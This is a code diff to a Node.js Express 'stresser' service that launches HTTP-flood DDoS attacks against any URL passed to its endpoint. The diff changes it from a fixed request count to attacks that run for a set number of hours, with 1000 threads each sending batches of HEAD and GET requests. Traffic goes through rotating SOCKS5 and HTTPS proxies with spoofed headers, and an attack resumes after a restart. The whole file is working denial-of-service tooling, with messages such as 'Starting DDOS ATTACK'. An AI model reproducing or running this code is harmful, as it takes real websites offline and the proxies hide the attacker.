@@ -10,13 +10,12 @@ const app = express();
 app.use(express.json());
 
 const stateFilePath = path.join(__dirname, 'attackState.json');
-const REQUESTS_PER_ATTACK = 1000; // Total requests to send per attack
+const REQUESTS_PER_THREAD = 1000; // Number of requests per thread per batch
 const numThreads = 1000; // Number of threads
-const REQUESTS_PER_THREAD = Math.ceil(REQUESTS_PER_ATTACK / numThreads); // Requests per thread
 
 const ensureStateFileExists = () => {
     if (!fs.existsSync(stateFilePath)) {
-        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, targetUrl: null, requestCount: 0 }));
+        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
     }
 };
 
@@ -27,14 +26,24 @@ const loadState = () => {
         return JSON.parse(data);
     } catch (error) {
         console.error(`Failed to read state file: ${error}`);
-        return { continueAttack: false, targetUrl: null, requestCount: 0 };
+        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
     }
 };
 
 let state = loadState();
 let continueAttack = state.continueAttack;
+let startTime = state.startTime;
+let duration = state.duration;
 let targetUrl = state.targetUrl;
-let requestCount = state.requestCount || 0;
+
+if (continueAttack && startTime && duration) {
+    const endTime = startTime + duration;
+    if (Date.now() > endTime) {
+        continueAttack = false;
+        state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+        fs.writeFileSync(stateFilePath, JSON.stringify(state));
+    }
+}
 
 const langHeaders = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -107,8 +116,20 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = async (url, agent, threadRequests, threadId) => {
-    if (!continueAttack || threadRequests <= 0) return;
+const performAttack = async (url, agent, threadId) => {
+    if (!continueAttack) return;
+
+    // Check if duration has expired
+    if (startTime && duration) {
+        const endTime = startTime + duration;
+        if (Date.now() > endTime) {
+            continueAttack = false;
+            state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+            fs.writeFileSync(stateFilePath, JSON.stringify(state));
+            console.log(rainbow(`Attack duration expired. Stopping thread ${threadId}.`));
+            return;
+        }
+    }
 
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -133,53 +154,49 @@ const performAttack = async (url, agent, threadRequests, threadId) => {
         "Origin": url.split("/").slice(0, 3).join("/")
     };
 
+    // Create an array of 10,000 HEAD and GET requests
+    const requests = Array.from({ length: REQUESTS_PER_THREAD }, () => [
+        axios.head(url, { httpAgent: agent, headers: headersForRequest }),
+        axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 })
+    ]).flat();
+
     try {
-        await Promise.all([
-            axios.head(url, { httpAgent: agent, headers: headersForRequest }),
-            axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 })
-        ]);
+        // Send all 10,000 requests simultaneously
+        await Promise.allSettled(requests.map(request => request.catch(err => {
+            if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
+                // console.log(rainbow(`Thread ${threadId}: Unable to Attack Target Server Refused!`));
+            } else if (err.response?.status === 404) {
+                // console.log(rainbow(`Thread ${threadId}: Target returned 404 (Not Found).`));
+            } else if (err.response?.status === 503) {
+                console.log(rainbow(`Thread ${threadId}: Target under heavy load (503) - Game Over!`));
+            } else if (err.response?.status === 502) {
+                console.log(rainbow(`Thread ${threadId}: Bad Gateway (502).`));
+            } else if (err.response?.status === 403) {
+                // console.log(rainbow(`Thread ${threadId}: Forbidden (403).`));
+            } else if (err.response?.status) {
+                // console.log(rainbow(`Thread ${threadId}: DDOS Status: (${err.response?.status})`));
+            } else {
+                // console.log(rainbow(`Thread ${threadId}: ${err.message || "ATTACK FAILED!"}`));
+            }
+            return null; // Return null for failed requests
+        })));
 
-        requestCount += 2;
-        state.requestCount = requestCount;
-        fs.writeFileSync(stateFilePath, JSON.stringify(state));
+        console.log(rainbow(`Thread ${threadId}: Completed batch of ${REQUESTS_PER_THREAD * 2} requests.`));
 
-        if (requestCount >= REQUESTS_PER_ATTACK) {
-            continueAttack = false;
-            state = { continueAttack: false, targetUrl: null, requestCount: 0 };
-            fs.writeFileSync(stateFilePath, JSON.stringify(state));
-            console.log(rainbow("Completed 10,000 requests. Attack stopped."));
-            return;
-        }
-
-        // Continue with the next request for this thread
-        if (threadRequests - 1 > 0) {
-            setTimeout(() => performAttack(url, agent, threadRequests - 1, threadId), 0);
+        // Continue with the next batch if duration allows
+        if (continueAttack) {
+            setTimeout(() => performAttack(url, agent, threadId), 0);
         }
     } catch (err) {
-        if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
-            // console.log(rainbow("Unable to Attack Target Server Refused!"));
-        } else if (err.response?.status === 404) {
-            // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-        } else if (err.response?.status === 503) {
-            console.log(rainbow("Target under heavy load (503) - Game Over!"));
-        } else if (err.response?.status === 502) {
-            console.log(rainbow("Bad Gateway (502)."));
-        } else if (err.response?.status === 403) {
-            // console.log(rainbow("Forbidden (403)."));
-        } else if (err.response?.status) {
-            // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
-        } else {
-            // console.log(rainbow(err.message || "ATTACK FAILED!"));
-        }
-
-        // Continue with the next request even on error
-        if (threadRequests - 1 > 0) {
-            setTimeout(() => performAttack(url, agent, threadRequests - 1, threadId), 0);
+        console.error(rainbow(`Thread ${threadId}: Batch failed: ${err.message}`));
+        // Continue with the next batch even on error
+        if (continueAttack) {
+            setTimeout(() => performAttack(url, agent, threadId), 0);
         }
     }
 };
 
-const startAttack = (url) => {
+const startAttack = (url, durationHours) => {
     if (!url || !/^https?:\/\//.test(url)) {
         console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
         return false;
@@ -193,9 +210,18 @@ const startAttack = (url) => {
 
     continueAttack = true;
     targetUrl = url;
-    requestCount = 0; // Reset request count for new attack
-    state = { continueAttack, targetUrl, requestCount };
+    startTime = Date.now();
+    duration = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
+
+    state = { continueAttack, startTime, duration, targetUrl };
     fs.writeFileSync(stateFilePath, JSON.stringify(state));
+
+    const attackTimeout = setTimeout(() => {
+        continueAttack = false;
+        state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+        fs.writeFileSync(stateFilePath, JSON.stringify(state));
+        console.log(rainbow("Attack duration expired. All threads stopped."));
+    }, duration);
 
     for (let i = 0; i < numThreads; i++) {
         if (!continueAttack) break;
@@ -206,28 +232,38 @@ const startAttack = (url) => {
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
         const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
-        // Each thread handles REQUESTS_PER_THREAD requests
-        performAttack(url, agent, REQUESTS_PER_THREAD, i);
+        performAttack(url, agent, i);
     }
     return true;
 };
 
 app.get("/stresser", async (req, res) => {
     const url = req.query.url;
+    const durationHours = parseFloat(req.query.duration) || 1;
 
     if (!url || !/^https?:\/\//.test(url)) {
         return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
     }
+    if (isNaN(durationHours) || durationHours <= 0) {
+        return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
+    }
 
-    await res.json({ message: `Starting DDOS ATTACK with ${REQUESTS_PER_ATTACK} requests...` });
-    startAttack(url);
+    await res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD} requests per batch...` });
+    startAttack(url, durationHours);
 });
 
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
 app.listen(port, () => {
     console.log(rainbow(`API running on http://localhost:${port}`));
-    if (continueAttack && targetUrl && requestCount < REQUESTS_PER_ATTACK) {
+    if (continueAttack && startTime && duration && targetUrl) {
         console.log(rainbow('Resuming previous attack...'));
-        startAttack(targetUrl);
+        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // Convert milliseconds back to hours
+        if (remainingDuration > 0) {
+            startAttack(targetUrl, remainingDuration);
+        } else {
+            continueAttack = false;
+            state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+            fs.writeFileSync(stateFilePath, JSON.stringify(state));
+        }
     }
 });
